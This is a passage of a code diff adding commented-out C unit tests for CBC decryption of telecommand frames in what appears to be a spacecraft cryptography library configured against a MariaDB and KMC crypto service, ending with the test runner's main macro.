+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+
+//     int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h = "2003182A000000120000000000000000000000000000000102FCFCF53E77DDCFD92993273B6C449B76CA1E";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     char* truth_data_h = "80d2c70008197f0b00310000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         //printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Decryption CBC MDB KMC with 1 Byte of padding
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_MDB_KMC_1B)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h = "2003182A0000001200000000000000000000000000000002011D90CE80C259660B229B6C1783C80E898D52";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     char* truth_data_h = "80d2c70008197f0b0031000000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Decryption CBC MDB KMC with 16 Bytes of padding
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_MDB_KMC_16B)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     char* test_frame_pt_h =
+//     "2003183A000000120000000000000000000000000000000310CA8B21BCB5AFB1A306CDC96C80C9208D00EB961E3F61D355E30F01CFDCCC7D026D56";
+//     uint8_t *test_frame_pt_b = NULL;
+//     int test_frame_pt_len = 0;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     char* truth_data_h = "80d2c70008197f0b003100000000b1fe";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     //printf("Decrypted Frame:\n");
+//     for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//         //ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     }
+//     printf("\n");
+
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Decryption CBC MDB KMC, NULL IV
+//  **/
+// UTEST(TC_PROCESS, DECRYPT_CBC_MDB_KMC_NULL_IV)
+// {
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_FALSE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 4, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+//                            //2003102E00000006DDB12ADB9F880659AD5703EF6D45BD4A0001EF2BD095982BC3AC58B8AB92484662E000000026F3
+//     char* test_frame_pt_h =
+//     "2003102C00000006703809AED191A8041A6DCEB4C030894400120218AB4508A560430D644DE39E35011E454755"; uint8_t
+//     *test_frame_pt_b = NULL; int test_frame_pt_len = 0;
+
+//     // Expose/setup SAs for testing
+//     SecurityAssociation_t* test_association = NULL;
+//     test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->arsn_len = 0;
+//     test_association->shsnf_len = 0;
+
+//     // Convert input test frame
+//     hex_conversion(test_frame_pt_h, (char**) &test_frame_pt_b, &test_frame_pt_len);
+
+//     status = Crypto_TC_ProcessSecurity(test_frame_pt_b, &test_frame_pt_len, tc_sdls_processed_frame);
+
+//     // char* truth_data_h = "80d2c70008197f0b00310000b1fe";
+//     // uint8_t* truth_data_b = NULL;
+//     // int truth_data_l = 0;
+
+//     // hex_conversion(truth_data_h, (char**) &truth_data_b, &truth_data_l);
+//     // //printf("Decrypted Frame:\n");
+//     // for(int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     // {
+//     //     //printf("%02x -> %02x ", tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     //     ASSERT_EQ(tc_sdls_processed_frame->tc_pdu[i], truth_data_b[i]);
+//     // }
+//     // //printf("\n");
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     free(test_frame_pt_b);
+//     Crypto_Shutdown();
+// }
+
+UTEST_MAIN();
+```
